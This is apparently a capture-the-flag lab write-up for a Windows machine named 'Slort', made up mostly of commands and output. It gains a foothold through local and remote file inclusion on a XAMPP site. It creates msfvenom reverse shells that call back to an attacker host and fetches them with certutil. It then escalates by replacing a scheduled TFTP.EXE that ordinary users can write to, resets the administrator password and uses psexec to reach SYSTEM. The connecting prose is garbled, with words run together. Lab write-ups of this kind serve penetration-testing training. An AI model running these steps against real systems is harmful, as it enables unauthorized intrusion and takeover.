###### tags: `Offsec` `PG Practice` `Intermediate` `Windows` # Slort
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.227.53 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.227.53:21
Open 192.168.227.53:135
Open 192.168.227.53:139
Open 192.168.227.53:445
Open 192.168.227.53:8080
Open 192.168.227.53:3306
Open 192.168.227.53:5040
Open 192.168.227.53:4443
Open 192.168.227.53:49669
Open 192.168.227.53:49668
Open 192.168.227.53:49667
Open 192.168.227.53:49665
Open 192.168.227.53:49666
Open 192.168.227.53:49664

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
3306/tcp  open  mysql?        syn-ack
4443/tcp  open  http          syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.227.53:4443/dashboard/
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5040/tcp  open  unknown       syn-ack
8080/tcp  open  http          syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
``` buster,find`http://192.168.227.53:8080/site`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ gobuster dir -u http://192.168.227.53:8080 -w /home/kali/SecLists/Discovery/Web-Content/common.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 301) [Size: 351] [--> http://192.168.227.53:8080/dashboard/]
/favicon.ico          (Status: 200) [Size: 30894]
/img                  (Status: 301) [Size: 345] [--> http://192.168.227.53:8080/img/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.227.53:8080/dashboard/]
/site                 (Status: 301) [Size: 346] [--> http://192.168.227.53:8080/site/]
Progress: 4727 / 4727 (100.00%)
``` probablyLFI,can[LFI - Windows Cheatsheet](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e)find
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ffuf -u http://192.168.227.53:8080/site/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 824, Words: 172, Lines: 22, Duration: 75ms]
C:/xampp/apache/logs/access.log [Status: 200, Size: 12286526, Words: 1480076, Lines: 102574, Duration: 105ms]
``` RFI,findcan,reverseshell
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p php/reverse_php LHOST=192.168.45.195 LPORT=445 -f raw > shell_445.php

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445

http://192.168.227.53:8080/site/index.php?page=http://192.168.45.195/shell_445.php

whoami
slort\rupert
``` `C:\Users\Public\Documents`downloadreverse
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.195 lport=139 -f exe > met_139.exe

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp139

cd Documents
certutil.exe -urlcache -f http://192.168.45.195/met_139.exe met_139.exe
met_139.exe
``` `C:\Users\rupert\Desktop`local.txt
```
C:\Users\rupert\Desktop>type local.txt
1f923ca6359c94121d732dce24afe1db
``` `C:\Backup`can`info.txt``TFTP.EXE`,5runTFTP.EXE,Checkfindcan,renamedownloadshell
```
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt

C:\Backup>icacls "C:\Backup\TFTP.EXE"
C:\Backup\TFTP.EXE BUILTIN\Users:(I)(F)
                   BUILTIN\Administrators:(I)(F)
                   NT AUTHORITY\SYSTEM:(I)(F)
                   NT AUTHORITY\Authenticated Users:(I)(M)

┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.195 lport=4443 -f exe > met_4443.exe

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp4443

C:\Backup>rename TFTP.EXE TFTP_1.EXE
rename TFTP.EXE TFTP_1.EXE

C:\Backup>certutil.exe -urlcache -f http://192.168.45.195/met_4443.exe TFTP.EXE
``` wait for reverse shellget administratorshell,`C:\Users\Administrator\Desktop`get proof.txt
```
C:\Users\Administrator\Desktop>type proof.txt
5132c50262e766fc232ab3bb11f5274e
``` get system
```
C:\Users\Administrator\Desktop>net user administrator admin

┌──(kali㉿kali)-[~/pgplay]
└─$ impacket-psexec administrator@192.168.227.53

Password: admin

C:\WINDOWS\system32> whoami
nt authority\system
```